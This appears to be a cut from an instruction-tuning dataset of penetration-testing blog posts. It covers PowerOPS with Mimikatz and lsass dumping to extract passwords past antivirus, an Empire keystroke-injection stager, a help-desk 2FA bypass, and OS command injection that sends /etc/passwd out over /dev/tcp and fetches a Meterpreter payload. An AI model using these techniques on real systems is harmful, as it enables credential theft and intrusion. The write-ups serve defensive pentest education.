Invoke-ShareFinder Examples I bet by now some of you have noticed the Invoke-Mimikatz function and are wondering does it work Well yes but it might have a weird glitch Close down PowerOPS and re-run it as an Administrator Attempt to run Mimikatz by typing Invoke-Mimikatz You might get the output pictured below Invoke-Mimikatz Unsuccessful I am not quite sure what the issue is here but by virtue of complete dumb-luck I found that it seems to work if I first run Invoke-Mimikittenz before running Invoke-Mimikatz I tried running a few other modules first and it didn't seem to fix the issue I plan on looking at this more later but for now it is fun to run kittenz before katz Invoke-Mimikittenz Invoke-Mimikatz Running Invoke-Mimikittenz Followed by Invoke-Mimikatz So what does AV have to say about this We recently had our annual Sacred Cash Cow Tipping AV-Bypass webcast WEBCAST Sacred Cash Cow Tipping 2016 Sadly a few AV vendors were feeling left out and they quickly contacted us to let us know and let us know they did Don't worry folks it's nothing personal We just don't have enough time to include everybody Lucky for some of you I will do double-duty and make the time to include you here The first AV engine that I tested this against was ESET ESET admittedly has a pretty snazzy interface with lots of cool bells and whistles I turned on all of them short of firewalling everything updated the database and attempted to run PowerOPS No alert was given on the initial execution Next I ran the Invoke-Mimikatz function and success I also did a manual scan on the executable and nothing was reported ESET Scan of PowerOPS File Invoke-Mimikatz not Detected by ESET Kaspersky though what about Kaspersky I installed Kaspersky and also enabled all of the features with the exception of whitelisting and locking down everything on the firewall Honestly if you're implementing a whitelisting-based approach in your environment then hats off to you That is a test for another blog post Here we are just looking at the detection capabilities I scanned the executable with Kaspersky and it stated that everything was good I ran PowerOPS and issued the Invoke-Mimikatz command The result Success At least so I thought The Invoke-Mimikatz call did succeed After running it again so that I could grab a screenshot for this blog post however Kaspersky told me that it had detected the activity and was going to remove the file Kaspersky Detecting Invoke-Mimikatz in PowerOPS So what gives Did it write a new signature Did its behavioral analysis engine learn something from the program executing No nothing quite that cool It turns out that Kaspersky was taking a while to fully load It's unclear if this is due to my VM 4GB 2 cores on an PCIe-SSD or if it is just the nature of the program It doesn't appear that Kaspersky's detections are effective during this loading window I just happened to run my test during that time frame and it resulted in the Invoke-Mimikatz function not being detected Kaspersky Loading Dang what to do now On recent engagements I have been skipping the use of Mimikatz on target systems since it does seem to get detected more frequently now I have typically been using the PowerShell Procdump script oshcode.org 4751 to dump the lsass process of the target machine I take that dump file offline and then run Mimikatz against it But for this test I went ahead and grabbed that script and made some slight modifications After the script executed the code to perform the process dump I added a sleep time of 10 seconds The sleep time is to help ensure that the dump routine has completed After the sleep I added the following code Invoke-Mimikatz -Command sekurlsa minidump dmp sekurlsa logonPasswords The previous command tells Mimikatz to run against the dump file that was created rather than attempting to scrape the memory directly Here's what the snippet of code now looks like in the PowerShell Procdump script Modified Powershell Procdump Script Now we need to add this into the PowerOPS Framework The authors made this process quite simple The first step is to convert the Procdump script to a Base64-encoded form I just copied and pasted the script into an online converter Base64 Encoding Procdump Script Next copy the Base64 code and open the PowerOPS.cs file in the PowerOPS directory Notice the functions that are already present and mimic their structure in order to add the new script This just involves creating a new function naming it what you want ProcDump in this case decoding the Base64 version of your script and returning that decoded string The snapshot below shows what this looks like Your Base64 code just goes in between the set of double-quotes Added ProcDump Function that Returns Decoded Form of Base64-Encoded Procdump Script The next step is to open the Program.cs file in the PowerOPS folder Find the portion in the code that has the series of pipeline.Commands.AddScript calls Add in a call to the function that you created You can see the addition in the following screenshot Adding Call to Add the Procdump Script The final step is needed to get our new functionality to display when we type the show command in the PowerOPS prompt Go towards the top of the script and find the DisplayModules function I went ahead and added the Get-ProcessDump string to the last Console Write call You can see this in the screenshot below Finally it's time to recompile the program Issue the compilation command that we used earlier Run the PowerOPS executable as an Administrator Type the show command to see that the function has been added Get-ProcessDump Displayed Kick off the process dump and Mimikatz invocation against the lsass process by typing the following Get-ProcessDump ps lsass And success For real this time though Successful Dump of Lsass and Password Extraction In conclusion I've given an overview of the awesome PowerOPS framework and how to get started with it Having many of the common PowerShell scripts in a single utility is very convenient Plus you are given the ability to run these scripts without the direct usage of powershell.exe It appears to bypass some AV vendors as-is For others we had to take a bit of a side-adventure in order to work around their detection methods This framework also has built-in application-whitelisting bypass techniques that I did not detail here but will do so in future blog posts PowerOPS is a tool that could very handy for pentesters and I highly encourage you to check it out ______ Follow Brian on Twitter fullmetalcache"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to DIY a Mobile Hacking Platform - Kali NetHunter on a Rooted Nexus7</title>\n<taxonomies>Author, Derek Banks, Physical, Red Team, Red Team Tools, DIY, DuckHunter, HID attack, KALI, Kali Linux, Kali NetHunter, mobile hacking platform, Mobile Pentesting Platform, Nexus7, Rooted Nexus7</taxonomies>\n<creation_date>Mon, 30 Jan 2017 16:01:40 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks As pentesters it is probably not a surprise that we tend to make fairly heavy use of Kali Linux on a fairly regular basis The folks at Offensive Security have an amazing selection of options for platforms that can run Kali One of those platforms is Kali NetHunter which runs on multiple phones and tablets such as various Nexus and OnePlus devices But why would anyone want a hacking platform on a mobile device Aside from the obvious cool factor of running some of my day-to-day pentesting tools like Metasploit and Recon-ng on a mobile device what really is the point I think a Mobile Pentesting Platform shines best on an onsite internal engagement that involves gaining unauthorized physical access like a Red Team or Physical Pen Test especially when it comes to HID keyboard style attacks like those possible with the USB Rubber Ducky I own multiple Rubber Ducky Devices and love them but a Mobile Pentesting Platform gives me the ability to have multiple HID attack options on the fly that would otherwise mean I would have to carry multiple USB devices I like options Before we can pull off this style of HID attack though we need to make the platform First make sure your device is supported I had a Nexus 7 2012 Wi-Fi tablet that had been demoted to lab use and was already unlocked These tablets are relatively cheap on eBay and have great support for unlocking the bootloader and rooting through the Nexus Root Toolkit by WugFresh I chose this route and used a Windows 7 virtual machine and VirtualBox Installing Kali NetHunter First download the appropriate NetHunter image for your device and check the file hash For a Nexus 7 2012 version the nethunter-grouper-lollipop-3.0 worked for me The instructions on the Offensive Security github wiki were up to date at the time of this post ithub.com offensive-security kali-nethunter wiki Windows-install As noted on their wiki each step needs to be performed This is important because skipping any part may result in a nonfunctional install This post includes screenshots to help walk through the install If your tablet doesn't have developer mode enabled do that This is an easy process On the device go to Settings About Tablet and tap on the Build Number seven times Once that has been completed turn on Advanced Reboot and Android Debugging options Download and install the Nexus Root Toolkit on your Windows system ww.wugfresh.com nrt Next choose the initial setup Full Driver Installation Guide Automatic Manual option and follow all instructions on each step Step one removes the old drivers from the Windows install Remove the Nexus 7 device from Device Manager and use USBDeview to remove everything else associated with an Android device and Google USB devices Disable USB debugging and unplug and plug the tablet into the computer In a few moments Windows should prompt to choose what to do with the device after driver configuration Select to view files and verify that the files system on the tablet can be accessed from Windows This needs to work to copy the Kali Nethunter Image to the tablet later In step 3 install the Google driver option 1 This consistently worked for me on 2 Nexus7 devices so hopefully that is the case with most Nexus7 devices Follow the prompts on the driver installation dialog and if everything was successful move to step 4 Run the Full Driver Test If everything was successful NRT will let you know If something went south start the process over something may have been skipped over If you are using a virtual machine with VirtualBox you see an ADB device was not found message check to make sure that the device is connected to the VM Next flash the device to a known good state Make sure any data you want off the device has been backed up elsewhere Since this is going to be a rooted mobile device running hacking software do not use it as a daily driver and put information you would consider sensitive or important on it NRT makes the flash to stock process easy choose the Flash Stock Unroot option and follow the instructions If there is a prompt on the tablet to Allow USB Debugging from the computer host accept to allow Use the recommended image for your device for the Nexus7 the NAKASI-GROUPER Android 5.1.1 Build LMY47V was what I chose After the device has been flashed to stock follow the device setup guide and re-enable Developer options and enable Advanced Reboot and Android Debugging options as before You should be prompted to allow USB debugging check always allow and accept Next click the choose the Root option do not select custom recovery image NRT will push the necessary files to the tablet and reboot and go into TWRP If you are asked to Keep the System Read-only I chose to allow writes by swiping to the right Once the process has completed reboot the tablet Once the process has rebooted the tablet NRT will notify that it has completed Repeat the root process again this time checking the Custom Recovery option After the second root process as completed successfully copy the nethunter-grouper-lollipop-3.0.zip file to the device I chose the Download directory Reboot the device and hold the power button and volume down At the bootloader screen navigate to and select Recovery to boot into recovery mode In TWRP choose install and select the nethunter-grouper-lollipop-3.0.zip file Swipe to confirm the flash then choose install packages I chose to install every option available Once the install has completed reboot the device After the flash it may take a few minutes for the device to boot past the splash screen Once you have booted back up NetHunter will now be installed Post Installation Configuration There are a few tasks to complete after installation to get the DuckHunter HID attack to work First we need to update NetHunter Open up the app and select Check App Update If there is an update there was at the time of this post download it You will need to uninstall NetHunter to install the update it will not install successfully over the existing install Go into Settings Apps and choose NetHunter and uninstall Once complete the latest APK should now successfully install When initially attempting to use Rubber Ducky scripts with NetHunter there was an issue loading the script into the DuckHunter HID feature with the native file system selection option The ZArchiver app from the Google Play store resolved this issue this will be needed to load Rubber Ducky scripts DuckHunter Attack and Demonstration Shellz At this point NetHunter is ready to run the DuckHunter HID attack When on an engagement I like to have one USB Rubber Ducky set up to establish a PowerShell Empire session we will use this to test out the functionality Use your favorite VPS provider I like DigitalOcean setup an Ubuntu based server and install PowerShell Empire from their Github repository Once set up run PowerShell Empire and set up a listener PowerShell Empire has a stager already built in to generate a Rubber Ducky script From the listener menu run usestager ducky to get to it Set the options of the stager to use the correct listener and set the OutFile to a location on the file system to write the script out to Copy the script off the VPS system to the NetHunter tablet and the attack is now ready to be launched For a demonstration of this attack in action take a look at the video below outu.be 9TxKuj_LYwA"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>GNU Screen Quick Reference</title>\n<taxonomies>Author, Brian King, How-To, GNU screen, handwriting, learning, memory, reference, SSH session</taxonomies>\n<creation_date>Wed, 01 Feb 2017 17:49:21 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Brian King I use GNU Screen mainly to prevent processes from dying when I disconnect from an SSH session but GNU Screen can do a whole lot more than that the man page is about 3700 lines long Clearly if I'm using it only to keep a session alive I'm not using the bulk of what it can do I made this cheat sheet and taped it to my monitor for a while so I can have these few options right in front of me every time I use Screen This way I more quickly memorize what I find useful and develop a base to build on When learning a new thing my handwritten notes are far more helpful than anything typed Sometimes I don't even look at the notes Just the mental act of organizing the information and the physical act of writing it helps me remember I thought I'd share the idea and this small example in the hopes that it helps someone else learn something new whether it's screen or something else In wading through the sea of options I found two resources that were a huge help periodic.net screen quick_reference omlee.co 2011 10 gnu-screen-splitting Published by Google Drive Report Abuse Updated automatically every 5 minutes"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Pink Teaming: The Dilution of Pentesting</title>\n<taxonomies>Author, John Strand, Red Team, industry trends, Pentesting, pink teaming, red teaming</taxonomies>\n<creation_date>Wed, 08 Feb 2017 15:49:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand There have been a few conversations at conferences and meet-ups over the past year or so about the validity of penetration testing There are many things on the horizon of computer security that are going to be disruptive to the industry as a whole And in large part these will be good for the industry One of them is the rise of bug bounty programs These are when an organization is hired to have a relatively obscure set of testers test your company resources I have seen the results first hand and they can be very good They have their limitations and their strengths but that is a topic for another blog Instead I want to focus on something we are seeing more and more of at BHIS A steady watering down of penetration tests Internally we call these Pink Teams A Pink Team is when the best of intentions of a Red Team get watered down Most all the time the direct technical contacts at the organizations we work with have the absolute best of intentions They want a true test of their organization's ability to detect and react to advanced threats But then the test starts to get watered down Restrictions from management and legal start to creep in Sometimes the concerns are very much legitimate based on FCC or HIPAA concerns Any test is going to have some level of restrictions and we expect that as it is part of doing business in this field But what I would like to talk about today is when the restrictions are not necessarily in line with a test at all Rather they border on the ridiculous For example here are a handful of things we have dealt with over the past few months Customers actively watching for the testing IP addresses which we gave at their request then actively blocking them as soon as they see any traffic from them Customers watching exploited systems real-time and actively disabling cmd.exe and PowerShell as we are using them Setting a large number of email addresses as off limits to phishing because they belong to important people in the organizations Having us stop testing as soon as we exploit a system then take a week to let us begin again Because they did not think we would get in and when we did they did not know what to do Having a group of people authorize every system we intend to exploit Then disallowing exploitation on the most likely targets I am writing these out not to poke fun at the customers but rather I want to address why this happens and how you can deal with it in your organization The first thing to understand is that these issues at their core are driven by a lack of understanding While our direct contacts almost always understand how a test is going to work the people who work with them may not The single best way to handle this is by setting up lunch-and-learns where you can walk through what is going to happen during a test We often do a webcast for systems administrators and developers to explain how they can remove the low hanging fruit from their environment It is very common for me to have meetings with our customers upper management to walk through what we are doing and why It is also important to clearly explain that an untested path will be attacked It is just a matter of time and training I talk for a living Teaching for SANS has exposed me to thousands of students some of them hostile I don't rattle very easily and I can usually get my point across in less than an hour I also have that outsider thing going for me Many times I say the exact same things that my technical contacts have been saying to management for years But because I am from outside the organization and sometimes for that reason only management listens The reasons above are why you need to be constant in your conversations and brown bag sessions Do not expect trust and understanding to simply appear in a one hour meeting trust is established over time Provide these meetings and sessions at least monthly After a while you will develop the trust and the base understanding of security and testing within your organization More importantly they will start to trust you even more This is the best defense against watering down of testing objectives"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Wi-Fi Travel Kits</title>\n<taxonomies>Author, Jordan Drysdale, Red Team, Wireless, onsite, pen-testing, penetration testing, Pentesting, Wi-Fi travel kit, wireless kit</taxonomies>\n<creation_date>Thu, 09 Feb 2017 16:50:03 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Sally and I recently ventured to an on-site wireless engagement with a very security-mature customer Long story short the level of protection that WPA2 Enterprise with certificate validation provides is worth the investment If your wireless is running just pre-shared keys and provides access to critical infrastructure it is time to invest in full wireless PKI The question Sally and I tried to answer before traveling was the obvious one before any engagement What should we bring Joff being one of the almighty seers at BHIS recommended that ...if it can wireless bring it After a couple of days spent on site my emptied backpack ended up looking like this Sally's look like so she is way more orderly So I ended with a couple of Raspberry Pi's several battery packs a couple of Ubiquiti devices one 5GHz client and another 2.4GHz AP another Engenius AP for testing PoE and port security yes this customer had all ports on lock-down too Full List Various antennae for use with vehicle-based and on-foot investigations of the area Alfa black 1000mW 1W 802.11g n High Gain Adapter Alfa black 7dBi RP-SMA Panel Alfa gray AWUS036NH Alfa gray AWUS051NH Joylive Yagi wireless antenna 2.4gHZ 802.11b g Multitude of small wifi adapters Raspberry Pi all running Kali with a custom hostapd config The Pi 3's have an onboard wireless NIC which was configured to broadcast a hidden cell for remote access Another hostapd config broadcasts an 802.1X network that matched the customer's and offers a self-signed cert for authentication The Alfa Panel Antenna worked fantastic here I could walk around and overwhelm the signal strength of the ceiling mount APs and cause clients to jump over and attempt mutual authentication That said no hashes were gathered in the fake EAP tunnel due to client configuration Raspberry Pi running Kismet with an Alfa antenna and Kismet for capturing PSK handshakes Hardware access point of convenience for use testing physical ports and Rogue AP countermeasures NetSpot software for the heat map Proxmark 3 RFID Cloner Rubber ducky with the WLAN profile retrieval script This was deemed to be outside the scope of our engagement Wi-Fi Pineapple Portable Keyboards USB Hubs both powered and not powered TP Link Wireless N Mini Router Engenius EAP350 Portable Power Packs to wander freely with devices Solar Charger 10000mAh Solar Power Bank 20 bucks on Amazon Josh Wright's Hacking Wireless Exposedfor reference Not pictured Wifi pineapple laptopsBurner mobile deviceYagi antennaCoffeeJordanSally The best information we were able to gather was through the Wi-Fi Pineapple With the mini-monitor we were able to get the Raspberry Pi authenticated to their guest network From there we could create NAT rules and appropriate routing to allow the physical ethernet interface access out to the world Once the Pineapple was powered up and routing through the Pi's guest connection we were able to launch a generic SSID harvesting attack and some other basically low value rogue wireless activities What's in your onsite wireless kit Read Part 2 Here ww.blackhillsinfosec.com wi-fi-travel-kit-v2-parts-list-backtrack"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Go Ahead, Make Our Day</title>\n<taxonomies>InfoSec 201, easter eggs, low hanging fruit, pen-testing, penetration testing, Pentesting, the best parts of our job</taxonomies>\n<creation_date>Wed, 15 Feb 2017 15:54:29 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven the BHIS Team I was recently on an assessment where I was able to grab all the password hashes from the domain controller When I extracted the hashes and saw that they were storing LANMAN hashes alongside the NTLM hashes I thought to myself Wow I LOVE my job There are many moments on pentests that you feel as giddy as that puppy so I decided to ask the other BHIS testers the following question When you are on in internal or pivot test what is something that really makes your day And here is what they replied Finding out that the organization grants administrator permissions to EVERYONE in the organization...now where is that Domain Admin logged in Hehehe David Logging on to the password cracker and finding that 50 of passwords have been cracked bonus if they are domain admin passwords Rick When Google's answer to product_name default password actually works Double points if it's the controller for the door locks BBKing Finding passwords in draft messages within Outlook Easier to spot when the draft is named Passwords -Kelsey Finding passwords in documents or source code Especially when they are database passwords And then finding the database contains social security numbers Ethan I love it when default credentials DON'T work I'm so tired of telling that story Other stories are so much more interesting to tell Please make me come up with a better story -Carrie Abusing security products to help further my malicious agenda For example getting access to a SIEM server finding the web server's private key then intercepting and decrypting IT security staff logins to the console -Beau When I get caught by a client's security team because they are doing the right thing and sufficiently monitoring log files and looking for anomalies in their environment Then working with them to further find gaps in their monitoring and IR process to better detect actual attackers Afterall that's why we do this pentest thing right To make the client better -Derek When I'm making phone calls to social engineer employees and after just a few attempts the employee has notified their admin who then notifies the entire company that they're being bombed with fake phone calls As much as I want in I really want people NOT to do what they are NOT supposed to do -Sierra I once found an old baseboard management controller that was missed from the customer's vulnerability management program The exposed TCP 49152 GET PSBlock plaintext password worked on every other system board I could find HP iLO Dell iDRAC IBM BMC -Jordan If you look carefully at the above list we like these things because they represent low-hanging fruit It lets us push the easy button Now that might sound like pentesters are just inherently lazy but the truth is that our job is to mimic real attackers Attackers take the path of least resistance which means starting with the obvious stuff default passwords guessable passwords crackable passwords hard-coded passwords unpatched systems cleartext sensitive data etc If the easy stuff works and the attacker gets what s he came for game over If the customer's up their game and fix the easy stuff it forces us to up our game as well or we will put ourselves out of business Challenge Accepted"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How to Bypass Two-Factor Authentication - One Step at a Time</title>\n<taxonomies>External/Internal, Red Team, 2FA, ask and it will be given to you, bypassing 2fa, help desk, helpful help desk, MailSniper, OWA, password policy, passwords, pen-testing, penetration testing, pentest, Pentesting, two-factor, VPN</taxonomies>\n<creation_date>Tue, 21 Feb 2017 15:43:26 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sally Vandeven Back in November Beau Bullock wrote a blog post describing how his awesome PowerShell tool MailSniper can sometimes bypass OWA portals to get mail via EWS if it has not been configured with the same two-factor authentication 2FA protection I used that technique on a recent test and was able to abuse the situation even further Here is my story I did a password spray on an external OWA portal and discovered that the password for the user who we will call Jane Doe was Spring2017 But I was not able to login to Jane's account because it required as you might have guessed a time-sensitive token provided by 2FA So I tried accessing Jane's mailbox via Exchange Web Service EWS using MailSniper and was able to retrieve Jane's mail messages from the server Cool So I can read her email That is sort of interesting but not really interesting enough I investigated what other external services were available on the organization's network and pretty predictably found a VPN but that was also protected by 2FA of course Clearly I needed to get access to those 2FA tokens if I was going to get anywhere Hmm On a crazy whim I waited until after hours and tried calling the organization's help desk hoping that someone was on call for off hours help I waited until after hours in order to maximize the chances that the real Jane Doe would not access her email and get suspicious before I could get to it and mark it as Read or delete it altogether Here is a paraphrased transcript of the call Help desk Hello this is Hal at the Acme Widget Help Desk How can I help you Me Hi Hal This is Jane Doe I would like to add another phone to my account to use for two-factor authentication when I connect to Acme's network when I am away from the office Is that possible Hal Of course that is possible I would be happy to help you get that set up First I need to know what type of phone it is Me It's an iPhone Hal Okay and what is your email address Jane Me It is jdoe acmewidgets.com This is the account for which I learned credentials from the password spray Hal Great Yes I see your email address in the directory I just sent an activation link to that account You will need to open the email up on your phone and click the link Me Sure Hang on I execute MailSniper and pull the email from the server using EWS Then I copy out the text of the email and paste it into a new outgoing email that I send to myself I open the email on my phone and click the link Me Ok It looks like I am all set up on my new phone So normally a push notification is sent to my primary phone How do I use the new secondary phone instead Hal You enter your username and then your password but don't press enter Instead add a comma after the password then add the 6 digit code from the app on your phone Me I think I understand Let me give it a try I try tacking on the code as Hal described and was able to successfully login to the VPN as Jane Doe Me Thank you Hal That worked perfectly Now just to be sure I understand the primary phone will continue to get push notifications unless I enter the code from my secondary phone in the password field when authenticating Is that correct I needed to be sure that the real Jane Doe was still able to access her account normally Hal Yes that's right Me You have been so helpful Hal Thank you so much Hal You are welcome and have a great day Jane At that point I was able to authenticate to the VPN and get access to the organization's Intranet and was now a trusted insider The next step would be to attempt to elevate privilege and pivot .and so the dominoes begin to fall The Problems It started with a weak password policy I was able to guess a user's password in a password spray attack Exchange Web Service was accessible without two-factor authentication The Help Desk did not authenticate me other than to incorrectly assume that since I had access to Jane Doe's mailbox I must be Jane Doe The Solutions Always use a strong password policy At BHIS we recommend at minimum a 15 character passphrase EWS is enabled by default with Exchange If not needed disable it altogether If it is required consider whitelisting only those applications that require access or enable it with 2FA Authenticate users before provisioning 2FA access tokens with more than just an email Passwords are stolen and guessed all the time and for use cases such as 2FA should not be considered sufficient authentication"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>End-User Education: Getting the Parentals Onboard</title>\n<taxonomies>InfoSec 101, Growing Pains, information security, Market Forces, Parents, Responsibility & Privilege, Supply & Demand</taxonomies>\n<creation_date>Thu, 23 Feb 2017 16:12:37 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Sierra Ward We're getting to that stage of life where we have to make some hard decisions regarding our parents How do we help them through sickness When and how do we know when it might be time to convince them to reconsider driving And when will it be time for them to say goodbye to the privilege of managing sensitive data online I recently had the tough conversation about password management with my own parents as predicted it was almost harder than telling them I was taking away the car To be fair I've been having information security pep talks with them for a while now so this wasn't out of the blue sky When I find good end user information I forward it to them I've explained to them about catching phishing emails watching actual URLs password hygiene and how they need to stop using short easy passwords and actually maybe possibly consider a password manager for longer more complex passwords But for the most part this was met with the fear of trying to learn a new system for everything they already do online I try to be sensitive to this It's easy to be frustrated with older people and their refusal to adopt new technology But I'm sure that in just a few short years I'll be the old foghey who can't quite grasp new things when my own kids try to explain to me the new systems and requirements for the dawn of yet a new age Finally after years of nagging my mom finally had me sit down with her and set up a password manager I explained that as hard as it is to get used to it will greatly simplify life She struggled at first and was a little perturbed when she realized having two-factor on meant she needed to basically be attached to her cell phone ahhh the universal mom struggle She upgraded her passwords and battened down all the hatches It was hard and required several hours where I sat near her to answer questions But she did it Then the real struggle came But now I can't look at the bank accounts online dad said hugely perturbed that I'd gone and wrecked the good thing he had going Well you need to open a password manager and you can share those particular passwords with mom I told him I'm not going to do that he said stubbornly Mom has shown great perseverance She's done something frustrating and difficult for her If you aren't able to take the time and energy to learn a new system then I'm not sure you're responsible enough to manage financial information online Unsurprisingly he was not at all happy with this verdict But like most kids I know exactly how much I can push my parents I knew by his voice that as frustrated as he was by what I was telling him he also knew I was right He eventually admitted defeat and backed down from managing important accounts online Mom breathed a sigh of relief as this verdict was a lot easier coming from me than from her Mom continued to surprise me in the following weeks even calling her bank to turn on two-factor and making other customer demands from companies with whom she does business It got me thinking in the industry of info sec we're often frustrated by end-users But perhaps end-users are what will really take us over the brink for education and awareness in the wider marketplace Will it be end-users who demand better infosec practices from the businesses they patron Will it be end-users who force companies to get penetration tested and secure their products and services because they stop using those businesses services otherwise Either way more education is always a good thing A high five to my mom for moving into this new age with panache and grace"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>OS Command Injection; The Pain, The Gain</title>\n<taxonomies>Red Team, Web App, All the Shellz, hacking, metasploit, msfvenom, netcat, OS Command Injection, pen-testing, Python, Real Life Hacking, Waiting</taxonomies>\n<creation_date>Wed, 01 Mar 2017 15:56:04 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts OS Command Injection is fun I recently found this vulnerability on a web application I was testing thanks to Burp Suite scanner I was excited because I knew shellz were in my future but it was not as easy as I expected Here was my journey and some things I learned First I knew the web server was Apache running on Red Hat Linux I could inject the following ping command and receive a hit to my external server at 1.2.3.4 let's pretend The semicolon at the beginning is what separated the injected command from the original command expected by the application ping -c 3 1.2.3.4 On my external server I could use the tcpdump command to see the ping requests coming in tcpdump -nni eth0 icmp Three Ping Requests Received on External Server So with that I was off to try all the things you do in this situation such as is nicely explained here but to no avail Then I realized that on Red Hat the netcat executable is usually named ncat or netcat so I modified the commands but that failed too I tried the following and that failed too cat etc passwd dev tcp 1.2.3.4 22 I was confused I definitely had command injection but nothing was working I finally figured out that the command length was limited to 32 characters likely because it was being written to a database first I discovered this by sending the ping command over and over again with varying numbers of spaces until it stopped working ping -c 3 1.2.3.4 ping -c 3 1.2.3.4 ping -c 3 1.2.3.4 ping -c 3 1.2.3.4 and so on Then on a whim I entered the following command and to my shock the contents of the etc passwd file were returned in the server response cat etc passwd I was shocked because no other commands including the ping command had returned the command output in the server response Then I got really confused I knew the echo command worked because I could receive the output from an echo command on my server as shown below Remember I was limited to 32 characters for the command echo h dev tcp 1.2.3.4 80 The only file I could cat was etc passwd I tried to write stuff to files using echo but it appeared I didn't have write access to the current directory I was in So I wrote to files in the tmp directory but I couldn't read them with the 32-character command limit to be sure it was working Why could I cat the etc passwd file and get the output in the server response but no other file Finally I paid closer attention to the server response containing the contents of etc passwd and realized that it was found in the response header and not body There were a lot of users on the list and it scrolled off the screen The content of the etc passwd file as shown in the example below happens to be similar to a response header jsmith x 1001 1000 Joe Smith Room 1007 234 555-8910 234 555-0044 email home jsmith bin sh In this case the critical component is that there is a word followed by a colon which happens to be in an acceptable format for inclusion as a response header To test this theory I injected the following echo some h I received some h in the web server response header Finally it was all making sense now I was making progress The following commands let me discover that no versions of netcat were installed but Python was Lovely Python The -n option tells echo not to output the trailing newline character This was important so that the output of the next command would be on the same line and maintain the proper format for inclusion as a response header echo -n s which nc echo -n s which ncat echo -n s which netcat echo -n s which python I used msfvenom to create the Python code to connect back to my Metasploit listener as described here I named the Python script z and put it in my home directory I tested out the Python code on my own Linux box but I kept getting TypeError expected string without null bytes I realized that I had the stage encoder enabled on the Metasploit handler When I disabled the stage encoder with set EnableStageEncoding false it worked Next I needed to get this python code written to a file on the web server For this I hosted the file on my web server and used wget to write the file to disk with this injected command wget myserver.net -O z And then execute it with this python z This successfully established a Meterpreter session for me but I was limited in some respects due to the connection not being a true tty I remember such a challenge at a recent capture the flag event and a little Googling turned up the solution again python -c 'import pty pty.spawn bin sh And there we have it My round-about methods for getting shell with OS command injection In hindsight it could have been so easy and quick but hey that's hacking Join the BHIS Blog Mailing List get notified when we post new blogs webcasts and podcasts jetpack_subscription_form show_only_email_and_button true custom_background_button_color undefined custom_text_button_color undefined submit_button_text Subscribe submit_button_classes undefined show_subscribers_total true"
    },
    {
        "input": "",
